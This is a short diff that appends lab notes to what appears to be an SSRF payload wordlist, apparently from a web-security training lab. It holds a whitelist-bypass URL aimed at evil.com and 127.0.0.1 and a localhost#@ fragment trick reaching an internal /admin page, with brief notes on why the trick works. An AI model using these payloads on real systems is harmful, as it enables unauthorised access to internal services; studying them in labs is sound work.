@@ -353,3 +353,17 @@ https://expected-host:pwd@evil.com%2f..%2f127.0.0.1
 # END OF WORDLIST
 # ================================
 
+
+
+
+
+Lab 4: Expert evel ssrf labb
+http://localhost#@stock.weliketoshop.net:8080/admin
+
+# - fragment
+@ - new host - used for whitelist
+but in backend server run means it fragment so not worked
+/admin - will be merged there
+
+executed in backend 
+
